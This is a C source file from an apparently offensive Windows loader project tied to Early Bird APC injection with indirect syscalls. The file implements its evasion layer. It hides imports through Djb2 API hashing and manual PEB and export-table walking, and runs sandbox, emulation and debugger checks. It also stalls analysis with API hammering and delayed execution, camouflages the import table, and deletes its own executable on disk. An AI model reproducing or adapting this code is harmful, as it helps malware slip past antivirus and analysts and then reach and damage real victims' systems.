#include "Evasion.h"
#include "EarlyBirdAPC-InDirectSyscalls.h"
#include <stdio.h>
#include <winternl.h>
//#define DEBUG //uncomment for debug check 
//Pseudo handle
#define NtCurrentProcess() ((HANDLE)-1)
//API Hammering temporary file
#define TMPFILE L"D34DD34D.tmp"
#define CYCLES ((DWORD)1000) //30 sec on R7 3700X
#define DELAY ((DWORD)7) //7 sec delay

//API Hashing using Djb2 for ANSI and Unicode
DWORD HashStringDjb2A(PCHAR String)
{
	ULONG Hash = 0xDEADC0DE;
	INT c;
	while (c = *String++)
		Hash = ((Hash << 0x5) + Hash) + c;
	return Hash;
}

DWORD HashStringDjb2W(PWCHAR String)
{
	ULONG Hash = 0xDEADC0DE;
	INT c;
	while (c = *String++)
		Hash = ((Hash << 0x5) + Hash) + c;
	return Hash;
}

//function to replace GetProcAddress
FARPROC NotGetProcAddress(IN HMODULE hModule, IN DWORD dwApiNameHash) {

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;

	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	// Looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		if (dwApiNameHash == HASH_ANSI(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}

//GetModuleHandle replacement
HMODULE NotGetModuleHandle(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {
		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
			CHAR UpperCaseDllName[MAX_PATH];
			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';
			if (HASH_ANSI(UpperCaseDllName) == dwModuleNameHash)
				return pDte->Reserved2[0];
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}


int CheckSleepForwarding() {
	DWORD startTime = GetTickCount();
	Sleep(2000);
	double elapsedTime = (GetTickCount() - startTime) / 1000.0;
	return (elapsedTime < 1.5) ? -1 : 0;
}

int CheckDebuggerPresence(fnIsDebuggerPresent pIsDebuggerPresent) {
	return pIsDebuggerPresent() ? -2 : 0;
}

int CheckApiEmulation1(fnFlsAlloc pFlsAlloc) {
	return (pFlsAlloc(0) == NULL) ? -3 : 0;
}

int CheckApiEmulation2(fnVirtualAllocExNuma pVirtualAllocExNuma) {
	return (pVirtualAllocExNuma(NtCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0) == NULL) ? -4 : 0;
}

int CheckExecControl() {
	HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "wuauctl");
	return (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) ? -5 : 0;
}

int APIHammering(DWORD dwStress) {
	WCHAR szPath[MAX_PATH * 2], szTmpPath[MAX_PATH];
	DWORD dwNumOfBytesRead = NULL, dwNumOfBytesWritten = NULL;
	PBYTE pRandBuff = NULL;
	SIZE_T sBuffSize = 0xFFFFF; // 1048575 bytes size
	INT Rand = 0;

	HANDLE hReadFile = INVALID_HANDLE_VALUE;
	HANDLE hWriteFile = INVALID_HANDLE_VALUE;

	// Get tmp folder path
	if (!GetTempPathW(MAX_PATH, szTmpPath)) {
		return -6;
	}

	// construct file path
	wsprintfW(szPath, L"%s%s", szTmpPath, TMPFILE);

	for (SIZE_T i = 0; i < dwStress; i++) {
		// Create file in write mode
		if ((hWriteFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
			return -7;
		}

		// allocate buffer and fill it with random data
		pRandBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
		srand(time(NULL));
		Rand = rand() % 0xFF;
		memset(pRandBuff, Rand, sBuffSize);

		// write random data into file
		if (!WriteFile(hWriteFile, pRandBuff, sBuffSize, &dwNumOfBytesWritten, NULL) || dwNumOfBytesWritten != sBuffSize) {
			return -8;
		}

		// clear the buffer
		RtlZeroMemory(pRandBuff, sBuffSize);
		CloseHandle(hWriteFile);

		// opne file in read mode and delete when it is done
		if ((hReadFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
			return -9;
		}

		// read the random data from the file
		if (!ReadFile(hReadFile, pRandBuff, sBuffSize, &dwNumOfBytesRead, NULL) || dwNumOfBytesRead != sBuffSize) {
			return -10;
		}

		// clean up
		RtlZeroMemory(pRandBuff, sBuffSize);
		HeapFree(GetProcessHeap(), NULL, pRandBuff);
		CloseHandle(hReadFile);
	}
	// all ok
	return 0;
}

int DelayExecution(DWORD dwDelay) {
	DWORD dwMilliseconds = dwDelay * 1000; // Convert seconds to milliseconds
	LARGE_INTEGER DelayInterval = { 0 };
	LONGLONG llDelay = dwMilliseconds * 10000; // Convert milliseconds to 100-nanosecond intervals
	DelayInterval.QuadPart = -llDelay;

	DWORD _T0 = GetTickCount64();
	DWORD _T1 = 0;

	// Define STATUS_TIMEOUT if not already defined
#ifndef STATUS_TIMEOUT
#define STATUS_TIMEOUT 0x00000102
#endif

// Correct function pointer type
	fnNtDelayExecution pNtDelayExecution = NotGetProcAddress(NotGetModuleHandle(H_MOD_NTDLL), H_FUNC_NTDELAYEXECUTION);
	if (!pNtDelayExecution) {
		return -11000; // Could not get function address
	}

	LONG status = pNtDelayExecution(FALSE, &DelayInterval);
	if (status != 0 && status != STATUS_TIMEOUT) {
		return -11001; // Error in NtDelayExecution
	}

	_T1 = GetTickCount64();
	if ((_T1 - _T0) < dwMilliseconds) {
		return -11002; // Delay was not sufficient
	}

	return 0;
}

BOOL SelfDestruct() {

	WCHAR                       szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO       Delete = { 0 };
	HANDLE                      hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO           pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
	SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;


	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		return FALSE;
	}

	// Cleaning up some structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//----------------------------------------------------------------------------------------
	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = StreamLength;
	RtlCopyMemory(pRename->FileName, NewStream, StreamLength);

	//----------------------------------------------------------------------------------------

	// Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		return FALSE;
	}

	//----------------------------------------------------------------------------------------
	// RENAMING

	// Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	// Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		return FALSE;
	}
	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------
	// DELETING

	// Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		return FALSE;
	}

	CloseHandle(hFile);
	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);
	return TRUE;
}

// generate a random compile-time seed
int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
}

void IATCamouflage() {
	PVOID pAddr = NULL;
	PVOID tempAddr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (tempAddr) {
		*(int*)tempAddr = RandomCompileTimeSeed() % 0xFF;
		pAddr = tempAddr;
	}
	int* A = (int*)pAddr;
	if (*A > 322) {
		//benign winapis
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = IsDialogMessageA(NULL, NULL);
	}
	HeapFree(GetProcessHeap(), 0, pAddr);
}

int InitEvasion() {
	fnVirtualAllocExNuma pVirtualAllocExNuma;
	fnFlsAlloc pFlsAlloc;
	fnIsDebuggerPresent pIsDebuggerPresent;

	pVirtualAllocExNuma = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_VIRTUALALLOCEXNUMA);
	pFlsAlloc = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_FLSALLOC);
	pIsDebuggerPresent = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_ISDEBUGGERPRESENT);

	IATCamouflage();
	if (CheckSleepForwarding() < 0) return -1;
#ifdef DEBUG
	if (CheckDebuggerPresence(pIsDebuggerPresent) < 0) return -2;
#endif // DEBUG
	if (CheckApiEmulation1(pFlsAlloc) < 0) return -3;
	if (CheckApiEmulation2(pVirtualAllocExNuma) < 0) return -4;
	if (CheckExecControl() < 0) return -5;
	if (APIHammering(CYCLES) != 0) return -6;
	if (DelayExecution(DELAY) != 0) return -7;
	//Check for self-destruct is not needed here, as it is called at the end of the program
	SelfDestruct();
	return 0;
}
